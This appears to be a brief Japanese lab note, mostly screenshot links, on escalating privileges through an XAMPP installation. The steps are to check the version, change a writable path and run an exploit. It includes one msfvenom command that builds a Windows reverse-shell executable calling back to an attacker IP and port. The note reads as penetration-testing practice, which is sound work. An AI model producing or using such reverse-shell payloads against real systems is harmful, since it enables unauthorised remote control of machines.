xamppのバージョンを確認

![[PE image.png]]

![[PE image 1.png]]

![[PE image 2.png]]

![[PE image 3.png]]

$replaceのpathを書き込み可能な場所に変更

![[PE image 4.png]]

![[PE image 5.png]]

実行

![[PE image 6.png]]

└─$ msfvenom -p windows/x64/shell_reverse_tcp -f exe -o msf.exe LHOST=192.168.45.231 LPORT=8000

![[PE image 7.png]]